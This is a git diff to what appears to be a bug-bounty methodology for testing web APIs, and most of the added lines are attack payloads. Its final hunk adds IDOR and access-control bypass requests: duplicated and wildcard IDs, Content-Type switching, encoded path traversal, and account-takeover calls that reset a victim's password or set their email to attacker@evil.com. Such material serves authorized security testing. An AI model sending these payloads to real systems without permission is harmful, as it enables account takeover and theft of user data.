@@ -4,7 +4,7 @@
   katana -list targets.txt -mdc 'contains(endpoint,"api")' -js
   katana -list targets.txt -mdc 'contains(endpoint,"api")' -js -silent -o apis.txt    # -f qurl for cleaning noise 'if exsit'
   ```
-- Read the docs files carefully to understand how the application communicates with its APIs, what endpoints exist, how authentication works, and which headers or parameters are required.
+- Read the `docs` files carefully to understand how the application communicates with its APIs, what endpoints exist, how authentication works, and which headers or parameters are required.
 - Then start testing the endpoints manually. For example, if you find something like:
   ```text
   https://example.com/v1/tasks/{taskID}
@@ -37,11 +37,10 @@
   * Test different HTTP methods (`GET`, `POST`, `PUT`, `PATCH`, `DELETE`)
   * Replace numeric IDs with UUIDs or vice versa
   * Remove or modify authorization-related headers
-  * Replay requests with another user’s identifiers
-  * Test rate limits and permission boundaries
+  * Replay requests with another user's identifiers
+  * Test rate-limits and permission boundaries
   * Compare responses between authenticated and unauthenticated requests
-- If it's a `JWT`, you can decode/analyze it using: **JWT.io**
-- To inspect things like:
+- If it's a `JWT`, you can decode/analyze it using: **JWT.io** to inspect things like:
   - Expiration
   - User ID
   - Roles
@@ -175,11 +174,82 @@ JSON wrap (403 Forbidden to 200 OK)
   ```
 Send ID twice
   ```text
-  https://example.com/api/users?id=<YourID>&id=<VictimID>
+  GET /api/users?id=<YourID>&id=<VictimID>
+  GET /api/profile?user_id=123&user_id=124
+  GET /api/profile?user_id=124&user_id=123
+  GET /api/profile?user_id[]=123&user_id[]=124 
   ```
 Send wildcard (return all users)
   ```json
   {
   "user_id":"*"
+  }
+  ```
+  ```text
+    # Wildcard in IDs
+    GET /api/user/*
+    GET /api/user/%
+    GET /api/user/_
+    
+    # Regex exploitation
+    GET /api/user/.*
+    GET /api/user/[0-9]+
+    
+    # Range specification
+    GET /api/users?ids=1-100
+    GET /api/users?ids=*
+  ```
+Content-Type Bypass
+  ```bash
+  # Original JSON request (blocked)
+  POST /api/update-profile
+  Content-Type: application/json
+  {"user_id": 124}
+  
+  # Try XML
+  POST /api/update-profile
+  Content-Type: application/xml
+  <user>
+    <user_id>124</user_id>
+  </user>
+  
+  # Try form data
+  POST /api/update-profile
+  Content-Type: application/x-www-form-urlencoded
+  user_id=124
+  ```
+Path Traversal Bypass
+  ```bash
+  # Directory traversal
+  GET /api/user/123
+  GET /api/user/../user/124
+  GET /api/user/./124
+  
+  # Encoding bypass
+  GET /api/user/%2e%2e%2fuser%2f124
+  GET /api/user/..%2fuser%2f124
+  
+  # Null byte injection (older systems)
+  GET /api/user/123%00/../../user/124
+  ```
+Using IDOR to takeover accounts (Attack id: 123):
+  ```bash
+  # Password reset via IDOR
+  POST /api/reset-password
+  {
+    "user_id": 124,
+    "new_password": "attacker_password"
+  }
+  
+  # Email change via IDOR
+  PUT /api/user/124/email
+  {
+    "new_email": "attacker@evil.com"
+  }
+  
+  # Adding authentication method
+  POST /api/user/124/add-phone
+  {
+    "phone": "+1234567890"
   }
   ```
